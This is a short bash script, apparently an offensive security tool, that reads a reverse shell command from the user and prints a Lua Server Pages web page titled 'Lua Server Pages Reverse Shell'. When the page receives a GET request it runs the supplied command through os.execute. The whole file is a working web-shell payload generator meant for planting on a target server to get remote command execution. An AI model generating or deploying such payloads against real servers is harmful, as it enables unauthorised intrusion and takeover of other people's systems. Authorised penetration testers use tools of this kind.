#!/bin/bash
echo "Enter your reverse shell (make sure to add the 'bash -c' line if needed)"
read revShell

echo " ================================Start Revshell=============================="
echo ""
echo ""
echo ""
echo "<div style=\"margin-left:auto;margin-right: auto;width: 350px;\">

<div id=\"info\">
<h2>Lua Server Pages Reverse Shell</h2>
<p>Delightful, isn't it?</p>
</div>

<?lsp if request:method() == \"GET\" then ?>
   <?lsp os.execute(\"$revShell\") ?>
<?lsp else ?>
   You sent a <?lsp=request:method()?> request
<?lsp end ?>

</div>"
